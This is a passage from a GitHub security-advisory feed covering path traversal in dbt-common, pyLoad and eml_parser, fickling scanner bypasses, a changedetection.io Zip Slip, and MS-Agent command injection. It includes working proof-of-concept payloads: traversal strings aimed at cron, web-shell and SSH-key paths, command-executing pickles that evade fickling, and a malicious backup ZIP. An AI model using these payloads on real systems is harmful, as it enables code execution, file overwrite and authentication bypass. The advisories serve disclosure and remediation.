<p>Fixed in <code>dbt-common</code> version 1.37.3 &amp; 1.34.2, and patched for dbt-core 1.11.7 and 1.10.20 releases.</p>
<p>The fix replaces <code>os.path.commonprefix()</code> with <code>os.path.commonpath()</code>, which correctly compares paths by their components rather than characters.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<ul>
<li>Only install dbt packages from trusted sources (official dbt Hub, verified git repositories)</li>
<li>Avoid installing packages from untrusted URLs or unverified third parties</li>
<li>Review package contents before installation when sourcing from external locations</li>
</ul>
<h3 id="resources">Resources</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<ol>
<li>CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'): <a href="https://cwe.mitre.org/data/definitions/22.html">https://cwe.mitre.org/data/definitions/22.html</a></li>
<li>CVE-2026-1703 (similar vulnerability in pip): <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1703">https://nvd.nist.gov/vuln/detail/CVE-2026-1703</a></li>
<li>pip fix PR #13777: <a href="https://github.com/pypa/pip/pull/13777">https://github.com/pypa/pip/pull/13777</a></li>
<li>Python documentation on <code>commonpath</code> vs <code>commonprefix</code>: <a href="https://docs.python.org/3/library/os.path.html#os.path.commonpath">https://docs.python.org/3/library/os.path.html#os.path.commonpath</a></li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dbt-labs/dbt-common/security/advisories/GHSA-w75w-9qv4-j5xj">https://github.com/dbt-labs/dbt-common/security/advisories/GHSA-w75w-9qv4-j5xj</a></li>
<li><a href="https://github.com/pypa/pip/pull/13777">https://github.com/pypa/pip/pull/13777</a></li>
<li><a href="https://github.com/dbt-labs/dbt-common/commit/e547954a48bac9394ef6eb98432e429dce9a7709">https://github.com/dbt-labs/dbt-common/commit/e547954a48bac9394ef6eb98432e429dce9a7709</a></li>
<li><a href="https://docs.python.org/3/library/os.path.html#os.path.commonpath">https://docs.python.org/3/library/os.path.html#os.path.commonpath</a></li>
<li><a href="https://github.com/advisories/GHSA-6vgw-5pg2-w6jp">https://github.com/advisories/GHSA-6vgw-5pg2-w6jp</a></li>
<li><a href="https://github.com/advisories/GHSA-w75w-9qv4-j5xj">https://github.com/advisories/GHSA-w75w-9qv4-j5xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w75w-9qv4-j5xj</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-05T00:59:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dbt-common] dbt-common's commonprefix() doesn't protect against path traversal]]></title>
        <id>https://github.com/advisories/GHSA-w75w-9qv4-j5xj</id>
        <link href="https://github.com/advisories/GHSA-w75w-9qv4-j5xj"/>
        <updated>2026-03-05T22:05:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>A path traversal vulnerability exists in dbt-common's <code>safe_extract()</code> function used when extracting tarball archives. The function uses <code>os.path.commonprefix()</code> to validate that extracted files remain within the intended destination directory. However, <code>commonprefix()</code> compares paths character-by-character rather than by path components, allowing a malicious tarball to write files to sibling directories with matching name prefixes.</p>
<p>For example, when extracting to <code>/tmp/packages</code>, a crafted tarball could write files to <code>/tmp/packagesevil/</code> by exploiting the character-based prefix matching.</p>
<p>This vulnerability affects users who:</p>
<ul>
<li>Install dbt packages from untrusted sources</li>
<li>Process tarball archives through dbt-common's extraction utilities</li>
</ul>
<p>The practical risk is limited because:</p>
<ul>
<li>Exploitation requires a malicious tarball to be processed</li>
<li>File writes are restricted to sibling directories with matching prefixes (not arbitrary paths)</li>
<li>Packages from trusted sources (dbt Hub) are not affected</li>
</ul>
<p>This is similar to CVE-2026-1703 in pip, which had a CVSS score of 3.9 (Low).</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>Fixed in <code>dbt-common</code> version 1.37.3 &amp; 1.34.2, and patched for dbt-core 1.11.7 and 1.10.20 releases.</p>
<p>The fix replaces <code>os.path.commonprefix()</code> with <code>os.path.commonpath()</code>, which correctly compares paths by their components rather than characters.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<ul>
<li>Only install dbt packages from trusted sources (official dbt Hub, verified git repositories)</li>
<li>Avoid installing packages from untrusted URLs or unverified third parties</li>
<li>Review package contents before installation when sourcing from external locations</li>
</ul>
<h3 id="resources">Resources</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<ol>
<li>CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'): <a href="https://cwe.mitre.org/data/definitions/22.html">https://cwe.mitre.org/data/definitions/22.html</a></li>
<li>CVE-2026-1703 (similar vulnerability in pip): <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1703">https://nvd.nist.gov/vuln/detail/CVE-2026-1703</a></li>
<li>pip fix PR #13777: <a href="https://github.com/pypa/pip/pull/13777">https://github.com/pypa/pip/pull/13777</a></li>
<li>Python documentation on <code>commonpath</code> vs <code>commonprefix</code>: <a href="https://docs.python.org/3/library/os.path.html#os.path.commonpath">https://docs.python.org/3/library/os.path.html#os.path.commonpath</a></li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dbt-labs/dbt-common/security/advisories/GHSA-w75w-9qv4-j5xj">https://github.com/dbt-labs/dbt-common/security/advisories/GHSA-w75w-9qv4-j5xj</a></li>
<li><a href="https://github.com/pypa/pip/pull/13777">https://github.com/pypa/pip/pull/13777</a></li>
<li><a href="https://github.com/dbt-labs/dbt-common/commit/e547954a48bac9394ef6eb98432e429dce9a7709">https://github.com/dbt-labs/dbt-common/commit/e547954a48bac9394ef6eb98432e429dce9a7709</a></li>
<li><a href="https://docs.python.org/3/library/os.path.html#os.path.commonpath">https://docs.python.org/3/library/os.path.html#os.path.commonpath</a></li>
<li><a href="https://github.com/advisories/GHSA-6vgw-5pg2-w6jp">https://github.com/advisories/GHSA-6vgw-5pg2-w6jp</a></li>
<li><a href="https://github.com/advisories/GHSA-w75w-9qv4-j5xj">https://github.com/advisories/GHSA-w75w-9qv4-j5xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w75w-9qv4-j5xj</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-05T00:59:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyLoad has an Arbitrary File Write via Path Traversal in edit_package()]]></title>
        <id>https://github.com/advisories/GHSA-6px9-j4qr-xfjw</id>
        <link href="https://github.com/advisories/GHSA-6px9-j4qr-xfjw"/>
        <updated>2026-03-05T00:32:21.000Z</updated>
        <content type="html"><![CDATA[<p>The edit_package() function implements insufficient sanitization for the pack_folder parameter. The current protection relies on a single-pass string replacement of "../", which can be bypassed using crafted recursive traversal sequences.</p>
<p>Exploitation</p>
<p>An authenticated user with MODIFY permission can bypass the sanitization by submitting a payload such as:
<code>pack_folder=..././..././..././tmp</code></p>
<p>After the single-pass replacement, this becomes:
<code>../../../tmp</code></p>
<p>Because the traversal sequences are not properly validated, the resulting normalized path escapes the intended storage directory and writes files to /tmp or other locations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-6px9-j4qr-xfjw">https://github.com/pyload/pyload/security/advisories/GHSA-6px9-j4qr-xfjw</a></li>
<li><a href="https://github.com/advisories/GHSA-6px9-j4qr-xfjw">https://github.com/advisories/GHSA-6px9-j4qr-xfjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6px9-j4qr-xfjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-05T00:32:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eml-parser] eml_parser: Path Traversal in Official Example Script Leads to Arbitrary File Write]]></title>
        <id>https://github.com/advisories/GHSA-389r-rccm-h3h5</id>
        <link href="https://github.com/advisories/GHSA-389r-rccm-h3h5"/>
        <updated>2026-03-05T00:16:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The official example script <code>examples/recursively_extract_attachments.py</code> contains a path traversal vulnerability that allows arbitrary file write outside the intended output directory. Attachment filenames extracted from parsed emails are directly used to construct output file paths without any sanitization, allowing an attacker-controlled filename to escape the target directory.</p>
<h3 id="details">Details</h3>
<p>File: <code>examples/recursively_extract_attachments.py</code>
Lines: 61–64</p>
<pre><code class="language-python">for a in m['attachment']:
    out_filepath = out_path / a['filename']  # No sanitization
    print(f'\tWriting attachment: {out_filepath}')
    with out_filepath.open('wb') as a_out:
        a_out.write(base64.b64decode(a['raw']))
</code></pre>
<p>The value <code>a['filename']</code> is attacker-controlled via crafted email attachment headers:</p>
<pre><code>Content-Disposition: attachment; filename="../outside/pwned.txt"
</code></pre>
<p>No path normalization or boundary validation is performed before writing.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a malicious <code>.eml</code> file:</li>
</ol>
<pre><code>Content-Disposition: attachment; filename="../outside/pwned.txt"
</code></pre>
<ol start="2">
<li>Run the example script:</li>
</ol>
<pre><code>python recursively_extract_attachments.py -p ./emails -o ./safe
</code></pre>
<ol start="3">
<li>Expected: <code>./safe/pwned.txt</code>  </li>
<li>Actual: <code>./outside/pwned.txt</code> ← written outside the intended directory</li>
</ol>
<p>Verified on Kali Linux with eml_parser installed via pip in a virtual environment.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability is limited to the <strong>example script only</strong> and does not affect the core eml_parser library. However, as the script is part of the official repository and is likely to be adapted for production use, an attacker supplying a crafted email could achieve arbitrary file write within the execution context.</p>
<p>Potential attack scenarios include:</p>
<ul>
<li>Cron job injection: <code>filename="../../etc/cron.d/backdoor"</code></li>
<li>Web shell upload: <code>filename="../../var/www/html/shell.php"</code></li>
<li>SSH key injection: <code>filename="../../home/user/.ssh/authorized_keys"</code></li>
</ul>
<h3 id="recommended-fix">Recommended Fix</h3>
<pre><code class="language-python">import os.path

for a in m['attachment']:
    filename = os.path.basename(a['filename'])
    out_filepath = out_path / filename

    if not out_filepath.resolve().is_relative_to(out_path.resolve()):
        print(f'[!] Skipping suspicious filename: {a["filename"]}')
        continue

    print(f'\tWriting attachment: {out_filepath}')
    with out_filepath.open('wb') as a_out:
        a_out.write(base64.b64decode(a['raw']))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GOVCERT-LU/eml_parser/security/advisories/GHSA-389r-rccm-h3h5">https://github.com/GOVCERT-LU/eml_parser/security/advisories/GHSA-389r-rccm-h3h5</a></li>
<li><a href="https://github.com/GOVCERT-LU/eml_parser/issues/88">https://github.com/GOVCERT-LU/eml_parser/issues/88</a></li>
<li><a href="https://github.com/GOVCERT-LU/eml_parser/commit/99af03a09a90aaaaadd0ed2ffb5eea46d1ea2cc9">https://github.com/GOVCERT-LU/eml_parser/commit/99af03a09a90aaaaadd0ed2ffb5eea46d1ea2cc9</a></li>
<li><a href="https://github.com/advisories/GHSA-389r-rccm-h3h5">https://github.com/advisories/GHSA-389r-rccm-h3h5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-389r-rccm-h3h5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T00:16:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fickling] Fickling missing RCE-capable modules in UNSAFE_IMPORTS]]></title>
        <id>https://github.com/advisories/GHSA-5hwf-rc88-82xm</id>
        <link href="https://github.com/advisories/GHSA-5hwf-rc88-82xm"/>
        <updated>2026-03-04T21:31:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="assessment">Assessment</h1>
<p>The modules <code>uuid</code>, <code>_osx_support</code> and <code>_aix_support</code> were added to the blocklist of unsafe imports (<a href="https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b">https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b</a>).</p>
<h1 id="original-report">Original report</h1>
<h2 id="summary">Summary</h2>
<p>fickling's <code>UNSAFE_IMPORTS</code> blocklist is missing at least 3 stdlib modules that provide direct arbitrary command execution: <code>uuid</code>, <code>_osx_support</code>, and <code>_aix_support</code>. These modules contain functions that internally call <code>subprocess.Popen()</code> or <code>os.system()</code> with attacker-controlled arguments. A malicious pickle file importing these modules passes both <code>UnsafeImports</code> and <code>NonStandardImports</code> checks.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>fickling &lt;= 0.1.8 (all versions)</li>
</ul>
<h2 id="details">Details</h2>
<h3 id="missing-modules">Missing Modules</h3>
<p>fickling's <code>UNSAFE_IMPORTS</code> (86 modules) does not include:</p>
<table>
<thead>
<tr>
<th>Module</th>
<th>RCE Function</th>
<th>Internal Mechanism</th>
<th>Importable On</th>
</tr>
</thead>
<tbody><tr>
<td><code>uuid</code></td>
<td><code>_get_command_stdout(cmd, *args)</code></td>
<td><code>subprocess.Popen((cmd,) + args, stdout=PIPE, stderr=DEVNULL)</code></td>
<td>All platforms</td>
</tr>
<tr>
<td><code>_osx_support</code></td>
<td><code>_read_output(cmdstring)</code></td>
<td><code>os.system(cmd)</code> via temp file</td>
<td>All platforms</td>
</tr>
<tr>
<td><code>_osx_support</code></td>
<td><code>_find_build_tool(toolname)</code></td>
<td>Command injection via <code>%s</code> in <code>_read_output("/usr/bin/xcrun -find %s" % toolname)</code></td>
<td>All platforms</td>
</tr>
<tr>
<td><code>_aix_support</code></td>
<td><code>_read_cmd_output(cmdstring)</code></td>
<td><code>os.system(cmd)</code> via temp file</td>
<td>All platforms</td>
</tr>
</tbody></table>
<p><strong>Critical note:</strong> Despite the names <code>_osx_support</code> and <code>_aix_support</code> suggesting platform-specific modules, they are importable on ALL platforms. Python includes them in the standard distribution regardless of OS.</p>
<h3 id="why-these-pass-fickling">Why These Pass fickling</h3>
<ol>
<li><strong><code>NonStandardImports</code></strong>: These are stdlib modules, so <code>is_std_module()</code> returns True → not flagged</li>
<li><strong><code>UnsafeImports</code></strong>: Module names not in <code>UNSAFE_IMPORTS</code> → not flagged</li>
<li><strong><code>OvertlyBadEvals</code></strong>: Function names added to <code>likely_safe_imports</code> (stdlib) → skipped</li>
<li><strong><code>UnusedVariables</code></strong>: Defeated by BUILD opcode (purposely unhardend)</li>
</ol>
<h3 id="proof-of-concept-using-ficklings-opcode-api">Proof of Concept (using fickling's opcode API)</h3>
<pre><code class="language-python">from fickling.fickle import (
    Pickled, Proto, Frame, ShortBinUnicode, StackGlobal,
    TupleOne, TupleTwo, Reduce, EmptyDict, SetItem, Build, Stop,
)
from fickling.analysis import check_safety
import struct, pickle

frame_data = b"\x95" + struct.pack("&lt;Q", 60)

# uuid._get_command_stdout — works on ALL platforms
uuid_payload = Pickled([
    Proto(4),
    Frame(struct.pack("&lt;Q", 60), data=frame_data),
    ShortBinUnicode("uuid"),
    ShortBinUnicode("_get_command_stdout"),
    StackGlobal(),
    ShortBinUnicode("echo"),
    ShortBinUnicode("PROOF_OF_CONCEPT"),
    TupleTwo(),
    Reduce(),
    EmptyDict(), ShortBinUnicode("x"), ShortBinUnicode("y"), SetItem(),
    Build(),
    Stop(),
])

# _aix_support._read_cmd_output — works on ALL platforms
aix_payload = Pickled([
    Proto(4),
    Frame(struct.pack("&lt;Q", 60), data=frame_data),
    ShortBinUnicode("_aix_support"),
    ShortBinUnicode("_read_cmd_output"),
    StackGlobal(),
    ShortBinUnicode("echo PROOF_OF_CONCEPT"),
    TupleOne(),
    Reduce(),
    EmptyDict(), ShortBinUnicode("x"), ShortBinUnicode("y"), SetItem(),
    Build(),
    Stop(),
])

# _osx_support._find_build_tool — command injection via %s
osx_payload = Pickled([
    Proto(4),
    Frame(struct.pack("&lt;Q", 60), data=frame_data),
    ShortBinUnicode("_osx_support"),
    ShortBinUnicode("_find_build_tool"),
    StackGlobal(),
    ShortBinUnicode("x; echo INJECTED #"),
    TupleOne(),
    Reduce(),
    EmptyDict(), ShortBinUnicode("x"), ShortBinUnicode("y"), SetItem(),
    Build(),
    Stop(),
])

# All three: fickling reports LIKELY_SAFE
for name, p in [("uuid", uuid_payload), ("aix", aix_payload), ("osx", osx_payload)]:
    result = check_safety(p)
    print(f"{name}: severity={result.severity}, issues={len(result.results)}")
    # Output: severity=Severity.LIKELY_SAFE, issues=0

# All three: pickle.loads() executes the command
pickle.loads(uuid_payload.dumps())  # prints PROOF_OF_CONCEPT
</code></pre>
<h3 id="verified-output">Verified Output</h3>
<pre><code>$ python3 poc.py
uuid: severity=Severity.LIKELY_SAFE, issues=0
aix: severity=Severity.LIKELY_SAFE, issues=0
osx: severity=Severity.LIKELY_SAFE, issues=0
PROOF_OF_CONCEPT
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker can craft a pickle file that executes arbitrary system commands while fickling reports it as <code>LIKELY_SAFE</code>. This affects any system relying on fickling for pickle safety validation, including ML model loading pipelines.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add to <code>UNSAFE_IMPORTS</code> in fickling:</p>
<pre><code class="language-python">"uuid",
"_osx_support",
"_aix_support",
</code></pre>
<p><strong>Longer term:</strong> Consider an allowlist approach — only permit known-safe stdlib modules rather than blocking known-dangerous ones. The current 86-module blocklist still has gaps because the Python stdlib contains hundreds of modules.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>Python source: <code>Lib/uuid.py</code> lines 156-168 (<code>_get_command_stdout</code>)</li>
<li>Python source: <code>Lib/_osx_support.py</code> lines 35-52 (<code>_read_output</code>), lines 54-68 (<code>_find_build_tool</code>)</li>
<li>Python source: <code>Lib/_aix_support.py</code> lines 14-30 (<code>_read_cmd_output</code>)</li>
<li>fickling source: <code>analysis.py</code> <code>UNSAFE_IMPORTS</code> set</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trailofbits/fickling/security/advisories/GHSA-5hwf-rc88-82xm">https://github.com/trailofbits/fickling/security/advisories/GHSA-5hwf-rc88-82xm</a></li>
<li><a href="https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b">https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b</a></li>
<li><a href="https://github.com/advisories/GHSA-5hwf-rc88-82xm">https://github.com/advisories/GHSA-5hwf-rc88-82xm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hwf-rc88-82xm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-04T21:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fickling] Fickling has `always_check_safety()` bypass: pickle.loads and _pickle.loads remain unhooked]]></title>
        <id>https://github.com/advisories/GHSA-wccx-j62j-r448</id>
        <link href="https://github.com/advisories/GHSA-wccx-j62j-r448"/>
        <updated>2026-03-04T21:30:18.000Z</updated>
        <content type="html"><![CDATA[<h1 id="assessment">Assessment</h1>
<p>The missing pickle entrypoints <code>pickle.loads</code>, <code>_pickle.loads</code>, and <code>_pickle.load</code> were added to the hook <a href="https://github.com/trailofbits/fickling/commit/8c24c6edabceab156cfd41f4d70b650e1cdad1f7">https://github.com/trailofbits/fickling/commit/8c24c6edabceab156cfd41f4d70b650e1cdad1f7</a>.</p>
<h1 id="original-report">Original report</h1>
<h2 id="summary">Summary</h2>
<p><code>fickling.always_check_safety()</code> does not hook all pickle entry points. <code>pickle.loads</code>, <code>_pickle.loads</code>, and <code>_pickle.load</code> remain unprotected, enabling malicious payload execution despite global safety mode being enabled.</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>&lt;= 0.1.8</code> (verified on current upstream HEAD as of 2026-03-03)</p>
<h2 id="non-duplication-check-against-published-fickling-ghsas">Non-duplication check against published Fickling GHSAs</h2>
<p>No published advisory covers hook-coverage bypass in <code>run_hook()</code>.
Existing advisories are blocklist/detection bypasses (runpy, pty, cProfile, marshal/types, builtins, network constructors, OBJ visibility, etc.), not runtime hook coverage parity.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>run_hook()</code> patches only:</p>
<ul>
<li><code>pickle.load</code></li>
<li><code>pickle.Unpickler</code></li>
<li><code>_pickle.Unpickler</code></li>
</ul>
<p>It does not patch:</p>
<ul>
<li><code>pickle.loads</code></li>
<li><code>_pickle.load</code></li>
<li><code>_pickle.loads</code></li>
</ul>
<h2 id="reproduction-clean-upstream">Reproduction (clean upstream)</h2>
<pre><code class="language-python">import io, pickle, _pickle
from unittest.mock import patch
import fickling
from fickling.exception import UnsafeFileError

class Payload:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (['echo','BYPASS'],))

data = pickle.dumps(Payload())
fickling.always_check_safety()

# Bypass path
with patch('subprocess.Popen') as popen_mock:
    pickle.loads(data)
    print('bypass sink called?', popen_mock.called)  # True

# Control path is blocked
with patch('subprocess.Popen') as popen_mock:
    try:
        pickle.load(io.BytesIO(data))
    except UnsafeFileError:
        pass
    print('blocked sink called?', popen_mock.called)  # False
</code></pre>
<p>Observed on vulnerable code:</p>
<ul>
<li><code>pickle.loads</code> executes payload</li>
<li><code>pickle.load</code> is blocked</li>
</ul>
<h2 id="minimal-patch-diff">Minimal patch diff</h2>
<pre><code class="language-diff">--- a/fickling/hook.py
+++ b/fickling/hook.py
@@
 def run_hook():
-    pickle.load = loader.load
+    pickle.load = loader.load
+    _pickle.load = loader.load
+    pickle.loads = loader.loads
+    _pickle.loads = loader.loads
</code></pre>
<h2 id="validation-after-patch">Validation after patch</h2>
<ul>
<li><code>pickle.loads</code>, <code>_pickle.loads</code>, and <code>_pickle.load</code> all raise <code>UnsafeFileError</code></li>
<li>sink not called in any path</li>
</ul>
<p>Regression tests added locally:</p>
<ul>
<li><code>test_run_hook_blocks_pickle_loads</code></li>
<li><code>test_run_hook_blocks__pickle_load_and_loads</code>
in <code>test/test_security_regressions_20260303.py</code></li>
</ul>
<h2 id="impact">Impact</h2>
<p>High-confidence runtime protection bypass for applications that trust <code>always_check_safety()</code> as global guard.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trailofbits/fickling/security/advisories/GHSA-wccx-j62j-r448">https://github.com/trailofbits/fickling/security/advisories/GHSA-wccx-j62j-r448</a></li>
<li><a href="https://github.com/trailofbits/fickling/commit/8c24c6edabceab156cfd41f4d70b650e1cdad1f7">https://github.com/trailofbits/fickling/commit/8c24c6edabceab156cfd41f4d70b650e1cdad1f7</a></li>
<li><a href="https://github.com/trailofbits/fickling/releases/tag/v0.1.9">https://github.com/trailofbits/fickling/releases/tag/v0.1.9</a></li>
<li><a href="https://github.com/advisories/GHSA-wccx-j62j-r448">https://github.com/advisories/GHSA-wccx-j62j-r448</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wccx-j62j-r448</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-04T21:30:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] changedetection.io has Zip Slip vulnerability in the backup restore functionality]]></title>
        <id>https://github.com/advisories/GHSA-25g8-2mcf-fcx9</id>
        <link href="https://github.com/advisories/GHSA-25g8-2mcf-fcx9"/>
        <updated>2026-03-05T10:54:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Zip Slip vulnerability in the backup restore functionality allows arbitrary file overwrite via path traversal in uploaded ZIP archives.</p>
<h3 id="details">Details</h3>
<p>A Zip Slip vulnerability in the backup restore functionality allows arbitrary file overwrite via path traversal in uploaded ZIP archives. The application uses zipfile.extractall() without validating entry paths, allowing ../ sequences to escape the extraction directory.</p>
<p>Vulnerable Code (lines 50-53):</p>
<pre><code>def restore_backup(self, filename):
    with zipfile.ZipFile(filename, 'r') as zip_ref:
        # VULNERABLE: No path validation before extraction
        zip_ref.extractall(self.datastore_path)
</code></pre>
<p>The extractall() function preserves the relative paths stored within the ZIP archive. When a malicious ZIP contains entries with ../ path traversal sequences, these files are extracted outside the intended directory.</p>
<table>
<thead>
<tr>
<th>Path in ZIP</th>
<th>Target File</th>
<th>Impact</th>
</tr>
</thead>
<tbody><tr>
<td>../secret.txt</td>
<td>Flask secret key</td>
<td>Session forgery, auth bypass</td>
</tr>
<tr>
<td>../changedetection.json</td>
<td>App settings</td>
<td>Disable password, inject backdoor</td>
</tr>
<tr>
<td>../url-watches.json</td>
<td>Watch index</td>
<td>Inject malicious watches</td>
</tr>
<tr>
<td>../{uuid}/watch.json</td>
<td>Watch config</td>
<td>Modify any watch</td>
</tr>
</tbody></table>
<p>Attacker uploads ZIP via the backup restore functionality at /backups/restore
Application extracts files without validation, writing attacker content to sensitive locations</p>
<h3 id="poc">PoC</h3>
<p>Step 1: Create Malicious ZIP</p>
<pre><code>import zipfile
import json

with zipfile.ZipFile("zipslip.zip", "w") as zf:
    # Escape extraction directory with ../
    zf.writestr("../secret.txt", "ATTACKER-CONTROLLED-SECRET")
    
    zf.writestr("../changedetection.json", json.dumps({
        "settings": {"application": {"password": ""}}
    }))
    
    zf.writestr("../pwned-uuid-1234/watch.json", json.dumps({
        "url": "https://attacker.com/zipslip-pwned",
        "title": "🔴 ZIPSLIP-PROOF"
    }))
</code></pre>
<p>Step 2: Upload via Restore Endpoint</p>
<pre><code class="language-curl">  -F "zip_file=@zipslip.zip" \
  -F "include_watches=y" \
  -F "include_settings=y" 
</code></pre>
<p>###Step 3: Verify Path Traversal</p>
<h3 id="check-if-watch-escaped-to-datastore">Check if watch escaped to /datastore/</h3>
<p>###ls -la /datastore/</p>
<h3 id="look-for-pwned-uuid-1234">Look for: pwned-uuid-1234/</h3>
<h3 id="verify-in-ui">Verify in UI</h3>
<p><code>curl "http://target:5000/" | grep "ZIPSLIP"</code></p>
<img src="https://github.com/user-attachments/assets/889e7d2b-b5fe-4658-aa88-e57995860d38" alt="f_cBHEuvFcXsOiI-pcj1wJ9yzKCRM" height="1080" width="1920">
### References

<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-25g8-2mcf-fcx9">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-25g8-2mcf-fcx9</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/1d7d812eb0faab37042246e2fbce04f29bb1b3aa">https://github.com/dgtlmoon/changedetection.io/commit/1d7d812eb0faab37042246e2fbce04f29bb1b3aa</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4">https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4</a></li>
<li><a href="https://github.com/advisories/GHSA-25g8-2mcf-fcx9">https://github.com/advisories/GHSA-25g8-2mcf-fcx9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-25g8-2mcf-fcx9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-04T21:28:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ms-agent] MS-Agent vulnerable to Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-4gc2-344q-r2rw</id>
        <link href="https://github.com/advisories/GHSA-4gc2-344q-r2rw"/>
        <updated>2026-03-04T21:14:09.000Z</updated>
        <content type="html"><![CDATA[<p>A Command Injection vulnerability in ModelScope's MS-Agent versions v1.6.0rc1 and earlier exists, allowing an attacker to execute arbitrary operating system commands through crafted prompt-derived input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2256">https://nvd.nist.gov/vuln/detail/CVE-2026-2256</a></li>
<li><a href="https://github.com/Itamar-Yochpaz/CVE-2026-2256-PoC">https://github.com/Itamar-Yochpaz/CVE-2026-2256-PoC</a></li>
<li><a href="https://github.com/modelscope/ms-agent">https://github.com/modelscope/ms-agent</a></li>
<li><a href="https://medium.com/@itamar.yochpaz/cve-2026-2256-from-ai-prompt-to-full-system-compromise-a4114c718326">https://medium.com/@itamar.yochpaz/cve-2026-2256-from-ai-prompt-to-full-system-compromise-a4114c718326</a></li>
<li><a href="https://www.hiddenlayer.com/research/indirect-prompt-injection-of-claude-computer-use">https://www.hiddenlayer.com/research/indirect-prompt-injection-of-claude-computer-use</a></li>
<li><a href="https://www.kb.cert.org/vuls/id/431821">https://www.kb.cert.org/vuls/id/431821</a></li>
<li><a href="https://github.com/advisories/GHSA-4gc2-344q-r2rw">https://github.com/advisories/GHSA-4gc2-344q-r2rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gc2-344q-r2rw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-02T21:31:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] changedetection.io vulnerable to XPath - Arbitrary File Read via unparsed-text()]]></title>
        <id>https://github.com/advisories/GHSA-6fmw-82m7-jq6p</id>
        <link href="https://github.com/advisories/GHSA-6fmw-82m7-jq6p"/>
        <updated>2026-03-05T10:54:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
